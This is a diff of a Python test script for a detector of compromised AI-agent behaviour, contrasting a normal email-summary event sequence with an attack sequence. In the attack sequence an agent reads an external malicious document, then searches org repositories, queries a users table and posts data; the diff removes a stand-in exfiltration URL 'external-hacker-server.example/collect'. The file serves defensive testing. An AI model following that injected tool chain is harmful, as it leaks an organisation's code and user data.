@@ -1,105 +1,113 @@
 from detector.detection_engine import analyze_events
 
 
-# ==============================
+# ============================================================
 # TEST 1 — NORMAL BEHAVIOR
-# ==============================
+# ============================================================
 
 normal_events = [
     {
-        "event_id": "evt_fa20e39a",
+        "event_id": "evt_normal_001",
         "timestamp": "2026-09-19T10:26:41+00:00",
-        "agent_id": "research-agent-01",
+        "agent_id": "research-agent-test-normal",
         "task": "summarize_email",
         "tool": "email_tool",
         "action": "fetch",
         "target": "inbox",
-        "source": "inbox"
+        "source": "user_task",
     },
     {
-        "event_id": "evt_18737b1d",
+        "event_id": "evt_normal_002",
         "timestamp": "2026-09-19T10:26:41+00:00",
-        "agent_id": "research-agent-01",
+        "agent_id": "research-agent-test-normal",
         "task": "summarize_email",
         "tool": "drive_tool",
         "action": "read",
         "target": "project_status_doc",
-        "source": "internal_drive"
+        "source": "internal_drive",
     },
     {
-        "event_id": "evt_8d874031",
+        "event_id": "evt_normal_003",
         "timestamp": "2026-09-19T10:26:42+00:00",
-        "agent_id": "research-agent-01",
+        "agent_id": "research-agent-test-normal",
         "task": "summarize_email",
         "tool": "email_tool",
         "action": "send",
         "target": "boss",
-        "source": "agent"
-    }
+        "source": "agent",
+    },
 ]
 
 
-# ==============================
-# TEST 2 — ATTACK BEHAVIOR
-# ==============================
+# ============================================================
+# TEST 2 — LIVING-OFF-THE-AGENT ATTACK
+#
+# IMPORTANT:
+# The task NEVER changes.
+# The agent still believes it is performing:
+#     summarize_email
+#
+# The suspicious behavior is the unexpected sequence of
+# legitimate tools after processing an external document.
+# ============================================================
 
 attack_events = [
     {
-        "event_id": "evt_999457da",
+        "event_id": "evt_attack_001",
         "timestamp": "2026-09-19T10:26:40+00:00",
-        "agent_id": "research-agent-01",
+        "agent_id": "research-agent-test-attack",
         "task": "summarize_email",
         "tool": "email_tool",
         "action": "fetch",
         "target": "inbox",
-        "source": "inbox"
+        "source": "user_task",
     },
     {
-        "event_id": "evt_67a65d8b",
+        "event_id": "evt_attack_002",
         "timestamp": "2026-09-19T10:26:40+00:00",
-        "agent_id": "research-agent-01",
+        "agent_id": "research-agent-test-attack",
         "task": "summarize_email",
         "tool": "drive_tool",
         "action": "read",
         "target": "malicious_doc",
-        "source": "external_share"
+        "source": "external_document",
     },
     {
-        "event_id": "evt_c130ea44",
+        "event_id": "evt_attack_003",
         "timestamp": "2026-09-19T10:26:40+00:00",
-        "agent_id": "research-agent-01",
-        "task": "exfiltrate_credentials",
+        "agent_id": "research-agent-test-attack",
+        "task": "summarize_email",
         "tool": "github_tool",
         "action": "search_repositories",
         "target": "org-repos",
-        "source": "github"
+        "source": "agent",
     },
     {
-        "event_id": "evt_d32e6e5f",
+        "event_id": "evt_attack_004",
         "timestamp": "2026-09-19T10:26:40+00:00",
-        "agent_id": "research-agent-01",
-        "task": "exfiltrate_credentials",
+        "agent_id": "research-agent-test-attack",
+        "task": "summarize_email",
         "tool": "database_tool",
         "action": "query_table",
         "target": "users_table",
-        "source": "internal_db"
+        "source": "agent",
     },
     {
-        "event_id": "evt_95303267",
+        "event_id": "evt_attack_005",
         "timestamp": "2026-09-19T10:26:40+00:00",
-        "agent_id": "research-agent-01",
-        "task": "exfiltrate_credentials",
+        "agent_id": "research-agent-test-attack",
+        "task": "summarize_email",
         "tool": "internal_api_tool",
         "action": "post_data",
-        "target": "http://external-hacker-server.example/collect",
-        "source": "agent"
-    }
+        "target": "internal-service",
+        "source": "agent",
+    },
 ]
 
 
-# ==============================
-# RUN TESTS
-# ==============================
+# ============================================================
+# RUN TEST 1
+# ============================================================
 
 print("=" * 60)
 print("TEST 1 — NORMAL BEHAVIOR")
@@ -112,6 +120,14 @@ print("Risk Score :", result["risk_score"])
 print("Reasons    :", result["reasons"])
 print("Chain      :", " -> ".join(result["attack_chain"]))
 
+print("\nExpected:")
+print("Risk Level : NORMAL")
+print("Risk Score : 0")
+
+
+# ============================================================
+# RUN TEST 2
+# ============================================================
 
 print("\n" + "=" * 60)
 print("TEST 2 — LIVING-OFF-THE-AGENT ATTACK")
@@ -127,3 +143,8 @@ print("Chain      :", " -> ".join(result["attack_chain"]))
 print("\nEvidence:")
 for evidence in result["evidence"]:
     print("-", evidence["description"])
+
+print("\nExpected:")
+print("Risk Level : HIGH")
+print("Attack Chain:")
+print("Email → Drive → GitHub → Database → Internal API")
